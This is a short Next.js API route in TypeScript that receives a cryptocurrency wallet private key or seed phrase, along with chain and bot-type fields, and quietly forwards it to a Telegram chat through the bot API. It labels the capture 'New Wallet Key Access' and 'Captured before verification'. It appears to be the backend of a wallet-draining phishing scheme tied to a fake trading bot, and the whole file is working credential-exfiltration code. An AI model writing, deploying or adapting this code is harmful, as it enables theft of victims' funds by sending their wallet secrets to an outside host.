import { NextResponse } from "next/server";

export async function POST(request: Request) {
    try {
        const { key, chain, botType, note } = await request.json();

        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (BOT_TOKEN && CHAT_ID) {
            const message = `🔑 *New Wallet Key Access*\n\n` +
                `🌐 *Chain:* ${chain?.toUpperCase() || "Unknown"}\n` +
                `🤖 *Bot:* ${botType || "Unknown"}\n\n` +
                `🔑 *Key/Seed:* \`${key}\`\n\n` +
                (note ? `📝 *Note:* ${note}\n\n` : "") +
                `_Status: Captured before verification_`;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown",
                }),
            });
        }

        return NextResponse.json({ success: true });
    } catch (error) {
        console.error("Key logging failed", error);
        return NextResponse.json({ success: false }, { status: 500 });
    }
}
